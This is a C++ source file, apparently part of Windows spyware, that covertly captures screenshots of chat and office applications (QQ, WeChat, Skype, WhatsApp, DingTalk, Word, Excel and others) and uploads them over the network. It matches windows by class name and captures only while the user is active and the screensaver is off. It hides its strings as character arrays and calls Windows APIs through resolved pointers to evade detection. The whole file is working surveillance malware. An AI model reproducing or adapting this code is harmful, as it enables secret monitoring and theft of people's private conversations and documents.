#include <Windows.h>
#include "../api.h"
#include "../public.h"
#include "AppScreenshot.h"
#include "ScreenSnapshot.h"
#include "../network/NetWorkdata.h"
#include "GetScreenFrame.h"
#include "../log.h"

#pragma comment(lib, "GdiPlus.lib")



using namespace Gdiplus;
using namespace std;

class GdiPlusIniter
{
public:
	GdiPlusIniter()
	{
		GdiplusStartupInput StartupInput;
		lpGdiplusStartup(&m_gdiplusToken, &StartupInput, NULL);
	}

	~GdiPlusIniter()
	{
		lpGdiplusShutdown(m_gdiplusToken);
	}
private:
	ULONG_PTR m_gdiplusToken;
};
// //need to initialize the Gdiplus object,else the function in screenshot will be in error






#define MAX_APPSCREENSHOT_LIMIT 16
#define MAX_APPSCREENSHOT_COUNT	9 
#define VIRTUAL_KEY_SIZE		256

int __stdcall GetAppScreenshot(int iTimeDelay)
{
	unsigned int iWaitTime = iTimeDelay * 1000;

	GdiPlusIniter GdiPlusIniterGlobal;

	int iRet = 0;
	int bFindWinByClass = FALSE;

	//char szWordWindowName[]		= {'_','W','w','G',0};
	//char szExcelWindowName[]		= {'E','X','C','E','L',0};
	//char szAliWangwangWindowName[]= {'A','e','f','_','R','e','n','d','e','r','W','i','d','g','e','t','H','o','s','t','H','W','N','D',0};
	//char szWhatsappWindowName[]		= {'I','n','t','e','r','m','e','d','i','a','t','e',' ','D','3','D',' ','W','i','n','d','o','w',0};
	//char szNewSkypeWindowName[]		= {'A','p','p','l','i','c','a','t','i','o','n','F','r','a','m','e','W','i','n','d','o','w',0};

	char szQQWindowname[] = { 'T','X','G','u','i','F','o','u','n','d','a','t','i','o','n',0 };
	char szWechatWindowName[] = { 'W','e','C','h','a','t','M','a','i','n','W','n','d','F','o','r','P','C',0 };
	char szAliWangwangWindowName[] = { 'S','t','a','n','d','a','r','d','F','r','a','m','e',0 };
	char szYYWindowName[] = { 'Q','W','i','d','g','e','t',0 };
	char szSkypeWindowName[] = { 't','S','k','M','a','i','n','F','o','r','m',0 };
	char szWordWindowName[] = { 'O','p','u','s','A','p','p',0 };
	char szExcelWindowName[] = { 'X','L','M','A','I','N',0 };
	char szWhatsappWindowName[] = { 'C','h','r','o','m','e','_','W','i','d','g','e','t','W','i','n','_','1',0 };
	char szDingTalkWindowName[] = { 'S','t','a','n','d','a','r','d','F','r','a','m','e','_','D','i','n','g','T','a','l','k',0 };

	//char szWechatLogin[]		= "WeChatLoginWndForPC";
	//char szWordCap[]		= "Microsoft Word 文档";
	//char szRealSkype[]		= {'S','k','y','p','e',0};
	//char szWangwangGBK[]	= {(char)0xb0,(char)0xa2,(char)0xc0,(char)0xef,(char)0xcd,(char)0xfa,(char)0xcd,(char)0xfa,0};
	//char szWechatCap[]		= "微信";

	char szQQ[] = { 'Q','Q',0 };
	char szWechat[] = { 'W','E','C','H','A','T',0 };
	char szWangwang[] = { 'A','L','I','W','A','N','G','W','A','N','G',0 };
	char szYY[] = { 'Y','Y',0 };
	char szWord[] = { 'W','O','R','D',0 };
	char szExcel[] = { 'E','X','C','E','L',0 };
	char szWhatsapp[] = { 'W','H','A','T','S','A','P','P',0 };
	char szSkype[] = { 'S','K','Y','P','E',0 };
	char szdingtalk[] = { 'd','i','n','g','t','A','l','k',0 };

	char szAppNameList[MAX_APPSCREENSHOT_LIMIT][64] = { 0 };
	lplstrcpyA(szAppNameList[0], szQQ);
	lplstrcpyA(szAppNameList[1], szWechat);
	lplstrcpyA(szAppNameList[2], szSkype);
	lplstrcpyA(szAppNameList[3], szWhatsapp);
	lplstrcpyA(szAppNameList[4], szWord);
	lplstrcpyA(szAppNameList[5], szExcel);
	lplstrcpyA(szAppNameList[6], szWangwang);
	lplstrcpyA(szAppNameList[7], szYY);
	lplstrcpyA(szAppNameList[8], szdingtalk);

	char szAppWindowClassNameList[MAX_APPSCREENSHOT_LIMIT][64] = { 0 };
	lplstrcpyA(szAppWindowClassNameList[0], szQQWindowname);
	lplstrcpyA(szAppWindowClassNameList[1], szWechatWindowName);
	lplstrcpyA(szAppWindowClassNameList[2], szSkypeWindowName);
	lplstrcpyA(szAppWindowClassNameList[3], szWhatsappWindowName);
	lplstrcpyA(szAppWindowClassNameList[4], szWordWindowName);
	lplstrcpyA(szAppWindowClassNameList[5], szExcelWindowName);
	lplstrcpyA(szAppWindowClassNameList[6], szAliWangwangWindowName);
	lplstrcpyA(szAppWindowClassNameList[7], szYYWindowName);
	lplstrcpyA(szAppWindowClassNameList[8], szDingTalkWindowName);

	int iAppCounter = MAX_APPSCREENSHOT_COUNT;
	int iAppIndex = 0;

	__try
	{
		unsigned int iWaitCnt = iWaitTime;
		int iFlagMouseKey = 0;
		RECT stAppRect = { 0 };
		POINT stLastPoint = { 0 };
		BYTE szLastKeyboardState[VIRTUAL_KEY_SIZE] = { 0 };
		while (TRUE)
		{
			lpSleep(SREENSNAPSHOT_WAIT_TIME_INTERVAL);

			HWND hTopWnd = lpGetForegroundWindow();
			if (hTopWnd == FALSE)
			{
				continue;
			}

			//不用window名称查找
			if (bFindWinByClass == TRUE)
			{
				for (iAppIndex = 0; iAppIndex < iAppCounter; iAppIndex++)
				{
					HWND hAppWnd = lpFindWindowA(0, szAppNameList[iAppIndex]);
					if (hAppWnd && hAppWnd == hTopWnd)
					{
						iRet = lpGetWindowRect(hAppWnd, &stAppRect);
						if (iRet == 0)
						{
							continue;
						}
						else {
							break;
						}
					}
					else
					{
						continue;
					}
				}
			}
			else {
				char szWindowClassName[MAX_PATH] = { 0 };
				iRet = lpGetClassNameA(hTopWnd, szWindowClassName, MAX_PATH);
				if (iRet == FALSE || *szWindowClassName == 0)
				{
					continue;
				}

				for (iAppIndex = 0; iAppIndex < iAppCounter; iAppIndex++)
				{
					if (lplstrcmpiA(szWindowClassName, szAppWindowClassNameList[iAppIndex]) != 0)
					{
						continue;
					}
					else
					{
						iRet = lpGetWindowRect(hTopWnd, &stAppRect);
						if (iRet == 0)
						{
							continue;
						}
						else {
							break;
						}
					}
				}

				if (iAppIndex >= iAppCounter)
				{
					continue;
				}
			}


			POINT stCurPoint = { 0 };
			iRet = lpGetCursorPos(&stCurPoint);
			if (lpRtlCompareMemory((char*)&stLastPoint, (char*)&stCurPoint, sizeof(POINT)) != sizeof(POINT))
			{
				lpRtlMoveMemory((char*)&stLastPoint, (char*)&stCurPoint, sizeof(POINT));
				iFlagMouseKey++;
			}

			BYTE szCurKeyboardState[VIRTUAL_KEY_SIZE] = { 0 };
			iRet = lpGetKeyboardState(szCurKeyboardState);
			if (lpRtlCompareMemory((char*)szLastKeyboardState, (char*)szCurKeyboardState, VIRTUAL_KEY_SIZE) != VIRTUAL_KEY_SIZE)
			{
				lpRtlMoveMemory((char*)&szLastKeyboardState, (char*)&szCurKeyboardState, VIRTUAL_KEY_SIZE);
				iFlagMouseKey++;
			}

			if (iFlagMouseKey == 0)
			{
				continue;
			}
			else
			{
				iWaitCnt++;
				if (iWaitCnt >= iWaitTime)
				{
					iWaitCnt = 0;
					iFlagMouseKey = 0;
				}
				else {
					continue;
				}
			}

			//check if is in screen save state
			int  iParam = 1;
			lpSystemParametersInfoA(SPI_GETSCREENSAVERRUNNING, 0, (PVOID)&iParam, 0);
			if (iParam)
			{
				//writeLog("screen is sleeping\r\n");
				continue;
			}

			char szScreenDCName[] = { 'D','I','S','P','L','A','Y',0 };

			int xscrn = stAppRect.right - stAppRect.left;			//lpGetDeviceCaps(hdc, HORZRES);
			int yscrn = stAppRect.bottom - stAppRect.top;			//lpGetDeviceCaps(hdc, VERTRES);

			int dwbmbitssize = 0;
			char* pixelData = 0;
			char* lpBuf = lpGlobalAlloc(GPTR, BMP_STREAM_SIZE);
			int dwBufSize = GetScreenFrame(BITSPERPIXEL, szScreenDCName, stAppRect.left, stAppRect.top, xscrn, yscrn, lpBuf, &pixelData, &dwbmbitssize);
			if (dwBufSize == FALSE)
			{
				continue;
			}


			IStream* istrBmp = NULL;
			IStream* istrJpg = NULL;
			iRet = _lpCreateStreamOnHGlobal(lpBuf, FALSE, &istrBmp);
			Bitmap stBmp(istrBmp);

			EncoderParameters encoderParameters;
			CLSID jpgClsid;
			char szusJpgFormat[] = { 'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'j',0,'p',0,'e',0,'g',0,0,0 };
			//char szusJpgFormat[]	= {'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'b',0,'m',0,'p',0,0,0};

			if (GetEncoderClsid((const WCHAR*)szusJpgFormat, &jpgClsid) == -1)
			{
				writeLog("GetScreenSnapshot GetEncoderClsid error\r\n");
				continue;
			}
			encoderParameters.Count = 1;
			encoderParameters.Parameter[0].Guid = EncoderQuality;
			encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
			encoderParameters.Parameter[0].NumberOfValues = 1;

			ULONG quality = JPG_TRANSFORM_QUALITY;
			encoderParameters.Parameter[0].Value = &quality;

			unsigned char* lpJpg = (unsigned char*)lpGlobalAlloc(GPTR, JPG_STREAM_SIZE);
			iRet = _lpCreateStreamOnHGlobal(lpJpg, FALSE, &istrJpg);

			Status status = stBmp.Save(istrJpg, &jpgClsid, &encoderParameters);
			if (status == 0)
			{
				if (*lpJpg == 0xff && *(lpJpg + 1) == 0xd8 && *(lpJpg + 2) == 0xff && *(lpJpg + 3) == 0xe0)
				{
					char* cTmp = _lpHexStrStr((char*)lpJpg, JPG_STREAM_SIZE, "\xff\xd9", 2);
					if (cTmp)
					{
						iRet = uploadData((char*)lpJpg, cTmp + 2 - (char*)lpJpg, APPSCREENSNAPSHOT, szAppNameList[iAppIndex]);
					}
				}
			}

			istrJpg->Release();
			istrBmp->Release();
			lpGlobalFree(lpBuf);
			lpGlobalFree((char*)lpJpg);
			continue;
		}
	}
	__except (1)
	{
		writeLog("AppScreenSnapShot exception\r\n");
		return FALSE;
	}
}


